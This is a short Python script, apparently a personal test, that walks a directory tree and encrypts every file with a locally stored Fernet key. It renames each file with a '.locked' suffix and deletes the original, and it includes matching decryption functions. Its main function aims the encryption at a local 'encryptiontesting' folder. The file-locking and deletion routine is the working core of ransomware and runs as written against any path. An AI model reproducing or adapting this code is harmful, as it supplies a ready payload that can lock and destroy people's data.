import os
import cryptography
from cryptography.fernet import Fernet
import base64

#key = Fernet.generate_key()
#with open("python\encryptionkey.txt", 'wb') as keyfile:
    #keyfile.write(key)

key = b''
with open("encryptionkey.txt", 'rb') as keyfile:
    key = keyfile.read()

def encrypt_file(filename):
    with open(filename, 'rb') as f:
        data = f.read()
    cipher = cryptography.fernet.Fernet(key)
    encrypted_data = cipher.encrypt(data)
    encrypted_filename = filename + '.locked'
    with open(encrypted_filename, 'wb') as f:
        f.write(encrypted_data)
    os.remove(filename)
    return encrypted_filename

def encrypt_directory(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            filename = os.path.join(root, file)
            encrypt_file(filename)

def decrypt_file(filename):
    with open(filename, 'rb') as f:
        encrypted_data = f.read()
    cipher = cryptography.fernet.Fernet(key)
    decrypted_data = cipher.decrypt(encrypted_data)
    decrypted_filename = filename[:-7]
    with open(decrypted_filename, 'wb') as f:
        f.write(decrypted_data)
    os.remove(filename)

def decrypt_directory(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            filename = os.path.join(root, file)
            if filename.endswith('.locked'):
                decrypt_file(filename)

def main():
    print("Hidey ho, neighbor.")
    encrypt_directory("F:\Coding\Dev\python\encryptiontesting")

if __name__ == '__main__':
    main()
